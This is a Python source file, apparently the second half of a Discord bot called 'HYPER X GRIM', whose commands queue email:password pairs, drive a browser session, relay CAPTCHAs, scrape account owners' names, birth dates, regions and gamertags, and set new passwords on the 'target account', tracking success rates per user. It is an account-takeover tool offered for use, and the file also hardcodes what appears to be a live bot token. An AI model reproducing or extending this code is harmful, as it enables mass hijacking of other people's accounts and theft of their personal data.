@bot.tree.command(name="status", description="Check your session and process status")
@check_login()
async def check_status(interaction: discord.Interaction):
    user_id = interaction.user.id
    
    fields = [{"name": "<a:access:1454135488381190316> Authentication", "value": "<a:Tick_green:1437430636175425719> Logged In", "inline": True}]
    
    if user_id in data_manager.processing_sessions:
        session = data_manager.processing_sessions[user_id]
        
        # Calculate elapsed time
        start_time = session.get("start_time")
        if isinstance(start_time, str):
            start_time = datetime.fromisoformat(start_time)
        elapsed_seconds = int((datetime.now() - start_time).total_seconds()) if start_time else 0
        elapsed_str = f"{elapsed_seconds // 60}m {elapsed_seconds % 60}s"
        
        account_info = session.get("account_info", {})
        email = session.get("email", "Unknown")
        custom_pw = session.get("custom_password", "Auto-Generated (GRIMXHYPER######)")
        captcha_attempts = session.get("captcha_attempts", 0)
        channel_id = session.get("channel_id")
        channel_mention = f"<#{channel_id}>" if channel_id else "Unknown"
        
        fields.append({"name": "<a:prefix:1454136086862495918> Current Step", "value": "⏳ **Awaiting CAPTCHA Solution**", "inline": True})
        fields.append({"name": "<a:clock_gif:1446068146736726159> Elapsed Time", "value": elapsed_str, "inline": True})
        fields.append({"name": "<a:mail:1454078802467749888> Target Account", "value": f"`{email}`", "inline": False})
        
        if account_info:
            name = account_info.get("name", "Not scraped yet")
            dob = account_info.get("dob", "N/A")
            region = account_info.get("region", "N/A")
            gamertag = account_info.get("gamertag", "N/A")
            fields.append({
                "name": "<:avatar:1449681349685542923> Account Details",
                "value": f"**Name:** {name}\n**DOB:** {dob}\n**Region:** {region}\n**Gamertag:** {gamertag}",
                "inline": False
            })
        
        fields.append({"name": "<:change:1454137450954887180> New Password", "value": f"`{custom_pw}`", "inline": True})
        fields.append({"name": "<a:prefix:1454136086862495918> CAPTCHA Attempts", "value": f"{captcha_attempts} / 3 used", "inline": True})
        fields.append({"name": "<a:Folder:1437430624804667457> Channel", "value": channel_mention, "inline": True})
        fields.append({"name": "<:change:1454137450954887180> Next Step", "value": "Use `/submit_captcha <text>` to continue\nUse `/cancel` to abort", "inline": False})
        
        embed = create_embed(
            "<a:WARN:1437415638103494819> Active Processing Session",
            f"CAPTCHA is waiting for your input in {channel_mention}",
            COLOR_WARNING,
            fields
        )
    else:
        # Show user stats
        user_stats = data_manager.stats.get("users_served", {}).get(str(user_id), {})
        processed = user_stats.get("processed", 0)
        success = user_stats.get("success", 0)
        
        fields.append({"name": "<a:prefix:1454136086862495918> Active Process", "value": "<a:Tick_green:1437430636175425719> None — Ready", "inline": True})
        fields.append({"name": "<a:Folder:1437430624804667457> Your Stats", "value": f"**Processed:** {processed}\n**Success:** {success}\n**Failed:** {processed - success}", "inline": True})
        fields.append({"name": "<:change:1454137450954887180> Start Processing", "value": "Use `/process email:password` to begin", "inline": False})
        embed = create_embed("<a:Tick_green:1437430636175425719> Session Status", "You are logged in and ready.", COLOR_SUCCESS, fields)
        
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="cancel", description="Cancel your current processing session")
@check_login()
async def cancel_process(interaction: discord.Interaction):
    user_id = interaction.user.id
    
    if user_id not in data_manager.processing_sessions:
        await interaction.response.send_message(
            embed=create_embed("<a:WARN:1437415638103494819> No Active Process", "You don't have an active process to cancel.", COLOR_INFO),
            ephemeral=True
        )
        return
    
    session = data_manager.processing_sessions[user_id]
    
    try:
        session["driver"].quit()
    except:
        pass
    
    if os.path.exists(session.get("captcha_file", "")):
        try:
            os.remove(session["captcha_file"])
        except:
            pass
    
    del data_manager.processing_sessions[user_id]
    
    await interaction.response.send_message(
        embed=create_embed("<a:Tick_green:1437430636175425719> Process Cancelled", "Your session has been terminated.", COLOR_SUCCESS)
    )

# ==================== QUEUE COMMANDS ====================

@bot.tree.command(name="queue", description="Add account(s) to the processing queue")
@app_commands.describe(
    accounts="One or more email:password pairs separated by commas or newlines",
    new_password="Optional custom password for all queued accounts"
)
@check_login()
async def queue_add(interaction: discord.Interaction, accounts: str, new_password: str = ""):
    user_id = interaction.user.id
    raw = [a.strip() for a in accounts.replace("\n", ",").split(",") if a.strip()]
    added = []
    errors = []
    for entry in raw:
        if ":" not in entry:
            errors.append(entry)
            continue
        email, pw = entry.split(":", 1)
        custom = new_password.strip() or None
        ticket, qlen = account_queue.add(user_id, email.strip(), pw.strip(), custom, interaction.channel_id)
        added.append((ticket, email.strip()))

    desc_lines = [f"{E['TICK']} `{em}` — ticket **#{t}**" for t, em in added]
    if errors:
        desc_lines.append(f"\n{E['CROSS']} Skipped (bad format): " + ", ".join(f"`{e}`" for e in errors))
    desc_lines.append(f"\n{E['FOLDER']} Queue size: **{account_queue.size}**")

    await interaction.response.send_message(
        embed=create_embed(
            f"{E['THUNDER']} Accounts Queued",
            "\n".join(desc_lines),
            COLOR_SUCCESS
        )
    )

@bot.tree.command(name="queue_status", description="View your queued accounts and position")
@check_login()
async def queue_status(interaction: discord.Interaction):
    user_id = interaction.user.id
    user_entries = account_queue.get_user_queue(user_id)
    active = len(data_manager.processing_sessions)

    fields = [
        {"name": f"{E['FOLDER']} Global Queue", "value": f"**Pending:** {account_queue.size}\n**Processing:** {active}/{MAX_CONCURRENT}", "inline": True},
    ]

    if user_entries:
        lines = [f"{E['MAIL']} `{e['email']}` — #{e['position']}" for e in user_entries]
        fields.append({"name": f"{E['CLOCK']} Your Queued Accounts", "value": "\n".join(lines), "inline": False})
    else:
        fields.append({"name": f"{E['TICK']} Your Queue", "value": "No pending accounts.", "inline": False})

    await interaction.response.send_message(
        embed=create_embed(f"{E['FOLDER']} Queue Status", "Current queue overview", COLOR_INFO, fields),
        ephemeral=True
    )

@bot.tree.command(name="queue_clear", description="[ADMIN] Clear the entire queue or a user's entries")
@app_commands.describe(user="Optional: clear only this user's queue entries")
async def queue_clear(interaction: discord.Interaction, user: discord.User = None):
    if interaction.user.id != ADMIN_ID:
        await interaction.response.send_message(
            embed=create_embed(f"{E['CROSS']} Access Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True
        )
        return

    if user:
        removed = account_queue.remove_user(user.id)
        await interaction.response.send_message(
            embed=create_embed(f"{E['TICK']} Queue Cleared", f"Removed **{removed}** entries for {user.mention}.", COLOR_SUCCESS)
        )
    else:
        removed = account_queue.clear()
        await interaction.response.send_message(
            embed=create_embed(f"{E['TICK']} Queue Cleared", f"Removed all **{removed}** entries from the queue.", COLOR_SUCCESS)
        )

# ==================== ADMIN COMMANDS ====================

@bot.tree.command(name="admin", description="[ADMIN] Control panel")
async def admin_panel(interaction: discord.Interaction):
    if interaction.user.id != ADMIN_ID:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Access Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True
        )
        return
    
    stats = data_manager.stats
    embed = create_embed(
        "<a:access:1454135488381190316> Admin Control Panel",
        "HYPER X GRIM Management",
        COLOR_PRIMARY,
        [
            {"name": "<a:Folder:1437430624804667457> Stats", "value": f"**Users:** {len(data_manager.authorized_users)}\n**Active Sessions:** {len(data_manager.active_sessions)}\n**Active Processes:** {len(data_manager.processing_sessions)}", "inline": True},
            {"name": "<a:Folder:1437430624804667457> Processing", "value": f"**Total:** {stats['total_processed']}\n**Success:** {stats['total_success']}\n**Failed:** {stats['total_failed']}", "inline": True},
            {"name": "<a:prefix:1454136086862495918> Status", "value": f"**Bot:** 🟢 Online\n**Webhook:** {'✅ Set' if data_manager.config.get('webhook_url') else '❌ Not Set'}", "inline": True},
            {"name": "<:change:1454137450954887180> Commands", "value": "`/authorize` `/revoke` `/list_users` `/set_webhook` `/stats`", "inline": False}
        ]
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="authorize", description="[ADMIN] Authorize a user")
@app_commands.describe(user="User to authorize")
async def authorize_user(interaction: discord.Interaction, user: discord.User):
    if interaction.user.id != ADMIN_ID:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Access Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True
        )
        return
    
    if data_manager.is_authorized(user.id):
        await interaction.response.send_message(
            embed=create_embed("<a:WARN:1437415638103494819> Already Authorized", f"{user.mention} is already authorized.", COLOR_INFO),
            ephemeral=True
        )
        return
    
    data_manager.authorize_user(user.id, interaction.user.id)
    
    await interaction.response.send_message(
        embed=create_embed(
            "<a:Tick_green:1437430636175425719> User Authorized",
            f"{user.mention} can now use the bot!",
            COLOR_SUCCESS,
            [{"name": "User ID", "value": f"`{user.id}`", "inline": True}]
        )
    )
    
    try:
        await user.send(embed=create_embed(
            "<a:Afree:1437415599138537564> Access Granted!",
            f"You've been authorized by {interaction.user.name}!\n\nUse `/help` to get started.",
            COLOR_SUCCESS
        ))
    except:
        pass

@bot.tree.command(name="revoke", description="[ADMIN] Revoke user access")
@app_commands.describe(user="User to revoke")
async def revoke_user(interaction: discord.Interaction, user: discord.User):
    if interaction.user.id != ADMIN_ID:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Access Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True
        )
        return
    
    if user.id == ADMIN_ID:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Error", "Cannot revoke admin.", COLOR_ERROR),
            ephemeral=True
        )
        return
    
    data_manager.revoke_user(user.id)
    await interaction.response.send_message(
        embed=create_embed("<a:Tick_green:1437430636175425719> Revoked", f"{user.mention}'s access removed.", COLOR_SUCCESS)
    )

@bot.tree.command(name="list_users", description="[ADMIN] List all authorized users")
async def list_users(interaction: discord.Interaction):
    if interaction.user.id != ADMIN_ID:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Access Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True
        )
        return
    
    user_list = []
    for user_id in data_manager.authorized_users:
        try:
            user = await bot.fetch_user(int(user_id))
            user_list.append(f"• **{user.name}** (`{user_id}`)")
        except:
            user_list.append(f"• Unknown (`{user_id}`)")
    
    await interaction.response.send_message(
        embed=create_embed("<:avatar:1449681349685542923> Authorized Users", "\n".join(user_list) if user_list else "No users", COLOR_PRIMARY),
        ephemeral=True
    )

@bot.tree.command(name="set_webhook", description="[ADMIN] Configure webhook URL")
@app_commands.describe(webhook_url="Discord webhook URL for results")
async def set_webhook(interaction: discord.Interaction, webhook_url: str):
    if interaction.user.id != ADMIN_ID:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Access Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True
        )
        return
    
    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Invalid", "Invalid webhook URL format.", COLOR_ERROR),
            ephemeral=True
        )
        return
    
    data_manager.config["webhook_url"] = webhook_url
    data_manager.save_config()
    
    await interaction.response.send_message(
        embed=create_embed("<a:Tick_green:1437430636175425719> Webhook Set", "Webhook URL configured successfully!", COLOR_SUCCESS),
        ephemeral=True
    )

@bot.tree.command(name="stats", description="[ADMIN] View detailed statistics")
async def view_stats(interaction: discord.Interaction):
    if interaction.user.id != ADMIN_ID:
        await interaction.response.send_message(
            embed=create_embed("<a:Cross:1437430620891644037> Access Denied", "Admin only.", COLOR_ERROR),
            ephemeral=True
        )
        return
    
    stats = data_manager.stats
    success_rate = (stats['total_success'] / stats['total_processed'] * 100) if stats['total_processed'] > 0 else 0
    
    top_users = sorted(stats['users_served'].items(), key=lambda x: x[1]['processed'], reverse=True)[:5]
    top_users_text = "\n".join([f"• <@{uid}>: {data['processed']} processed ({data['success']} success)" for uid, data in top_users]) if top_users else "No data"
    
    embed = create_embed(
        "<a:Folder:1437430624804667457> Bot Statistics",
        "Detailed performance metrics",
        COLOR_PRIMARY,
        [
            {"name": "<a:Folder:1437430624804667457> Total Processing", "value": f"**Processed:** {stats['total_processed']}\n**Success:** {stats['total_success']}\n**Failed:** {stats['total_failed']}", "inline": True},
            {"name": "<a:thunder_react:1445336405311094817> Success Rate", "value": f"**{success_rate:.1f}%**", "inline": True},
            {"name": "<:avatar:1449681349685542923> Users", "value": f"**Total:** {len(data_manager.authorized_users)}\n**Active:** {len(data_manager.active_sessions)}", "inline": True},
            {"name": "<a:thunder_react:1445336405311094817> Top Users", "value": top_users_text, "inline": False}
        ]
    )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ==================== RUN BOT ====================
BOT_TOKEN = "MTQ3NTg2OTI4OTk5MDA2MjIwMA.Gu8zAH.z87NlxEWGTrVLnKVB_dmYGvMM9fmfamfd0n-xc"

if __name__ == "__main__":
    try:
        print("\n🚀 Starting HYPER X GRIM bot...")
        bot.run(BOT_TOKEN)
    except discord.errors.LoginFailure:
        print("\n❌ CRITICAL ERROR: Invalid bot token!")
        print("Please check your token and try again.\n")
    except KeyboardInterrupt:
        print("\n👋 Bot shutting down gracefully...")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        traceback.print_exc()